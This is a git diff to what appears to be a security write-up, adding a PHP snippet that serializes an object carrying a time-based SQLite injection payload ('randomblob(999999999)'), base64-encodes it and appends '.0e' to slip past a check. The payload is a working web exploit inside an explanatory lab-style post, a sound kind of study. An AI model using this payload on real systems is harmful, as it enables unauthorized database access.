@@ -52,6 +52,22 @@ Note: The SQLite `randomblob()` function returns a blob containing pseudo-random
 
 ![IMG5](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3132b08b-bd51-4666-bc5e-08125625a523)
 
+```
+<?php
+
+class insert_log
+{
+  // SQLi payload here 
+  public $new_data = "0XMohomiester'); select 1 = randomblob(999999999);--";
+}
+$obj = new insert_log();
+// Serializing object 
+$a = serialize($obj);
+// Base64 encoding of serialized data and concatenate it with .0e 
+$final_payload = base64_encode($a) . ".0e";
+echo $final_payload;
+
+```
 
 Let's try it :
 
